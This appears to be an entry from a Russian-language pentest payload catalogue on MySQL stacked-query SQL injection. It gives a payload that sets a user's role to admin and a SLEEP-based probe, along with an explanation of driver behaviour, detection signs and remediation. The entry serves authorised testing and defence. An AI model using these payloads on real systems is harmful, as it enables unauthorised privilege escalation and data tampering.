---
id: sqli-mysql-stacked-queries
title: "MySQL: stacked queries (несколько запросов в одном вызове)"
type: sqli
target: mysql
category: web
difficulty: advanced
bypass: none
tags: [sqli, mysql, stacked, pdo]
tested_on: ["PHP PDO + MySQL"]
success_rate: 0.35
risk: high
cwe: "CWE-89"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "data-tampering"
    type: leads_to
---

# MySQL: stacked queries (несколько запросов в одном вызове)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
1'; UPDATE users SET role='admin' WHERE id=2; -- -
```

## Explanation

Некоторые драйверы (`mysqli::multi_query`, PDO с `PDO::MYSQL_ATTR_MULTI_STATEMENTS`,
psql через `PQexec`) позволяют выполнить несколько запросов, разделённых `;`.
Это превращает инъекцию из чтения данных в произвольную модификацию.
В связке PHP+PDO мульти-запросы для `prepare()` по умолчанию запрещены —
успех зависит от конфигурации.

## Detection

Признаки: драйвер с multi-statement, ошибка синтаксиса после `;`, либо реально
изменившиеся данные. Безопасная проверка — `1'; SELECT SLEEP(3); -- -`.

## Remediation

- Отключить multi-statements в драйвере/DSN.
- Prepared statements физически не дают выполнить второй запрос.
- Учётка БД без `UPDATE`/`DELETE` там, где нужно только чтение.

## Variants

```
1'; SELECT SLEEP(3); -- -
```
